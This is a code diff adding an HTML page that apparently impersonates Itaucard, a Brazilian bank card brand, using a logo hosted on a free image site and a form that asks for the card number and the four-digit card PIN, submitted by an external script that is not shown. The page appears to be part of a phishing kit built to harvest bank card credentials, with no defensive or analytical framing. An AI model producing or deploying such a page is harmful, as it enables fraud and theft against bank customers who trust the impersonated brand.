@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaucard</title>
+    <link rel="stylesheet" href="estilo.css">
+</head>
+<body>
+    <div class="topo">
+        <span class="texto">Itaucard</span>
+        <img src="https://i.ibb.co/P93gD8p/IMG-20241209-WA0100-removebg-preview.png" alt="Descrição" class="imagem">
+    </div>
+
+    <div class="formulario-container">
+        <!-- Formulário para enviar os dados -->
+        <form id="formulario" onsubmit="enviarDados(event)">
+            <label for="numero-cartao" class="formulario-label">Número do Cartão</label>
+            <input type="tel" id="numero-cartao" name="numero-cartao" placeholder="Número do Cartão" class="formulario-input" maxlength="19" inputmode="numeric" oninput="formatarCartao(this)" required>
+            
+            <label for="senha-cartao" class="formulario-label">Senha (4 dígitos)</label>
+            <input type="tel" id="senha-cartao" name="senha-cartao" placeholder="Senha (4 dígitos)" class="formulario-input" maxlength="4" inputmode="numeric" oninput="formatarSenha(this)" required>
+            
+            <button type="submit" class="botao-acessar">Acessar</button>
+        </form>
+    </div>
+
+    <script src="script.js"></script> <!-- Redirecionamento para o JavaScript -->
+</body>
+</html>
